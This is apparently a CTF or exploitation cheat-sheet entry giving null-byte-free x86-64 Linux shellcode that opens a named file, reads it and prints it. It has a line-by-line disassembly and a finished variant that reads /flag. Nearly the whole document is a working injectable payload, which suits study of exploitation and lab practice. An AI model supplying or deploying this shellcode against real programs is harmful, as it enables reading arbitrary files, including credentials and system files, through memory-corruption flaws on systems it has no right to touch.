## Read (No Null Bytes):

Read `<file>` :
```bash
\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff <Add File Name in Bytes>
```

> [!info]- Bytes breakdown
>
>```shell
> 0000000000400080 <.text>:
>   400080: eb 2f                 jmp    0x4000b1
>   400082: 5f                    pop    rdi
>   400083: 6a 02                 push   0x2
>   400085: 58                    pop    rax
>   400086: 48 31 f6              xor    rsi,rsi
>   400089: 0f 05                 syscall 
>   40008b: 66 81 ec ef 0f        sub    sp,0xfef
>   400090: 48 8d 34 24           lea    rsi,[rsp]
>   400094: 48 97                 xchg   rdi,rax
>   400096: 48 31 d2              xor    rdx,rdx
>   400099: 66 ba ef 0f           mov    dx,0xfef
>   40009d: 48 31 c0              xor    rax,rax
>   4000a0: 0f 05                 syscall 
>   4000a2: 6a 01                 push   0x1
>   4000a4: 5f                    pop    rdi
>   4000a5: 48 92                 xchg   rdx,rax
>   4000a7: 6a 01                 push   0x1
>   4000a9: 58                    pop    rax
>   4000aa: 0f 05                 syscall 
>   4000ac: 6a 3c                 push   0x3c
>   4000ae: 58                    pop    rax
>   4000af: 0f 05                 syscall 
>   4000b1: e8 cc ff ff ff        call   0x400082
>  <FILE NAME>
> ```


Read `/flag` : 
```shell
\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67\x00
```


---
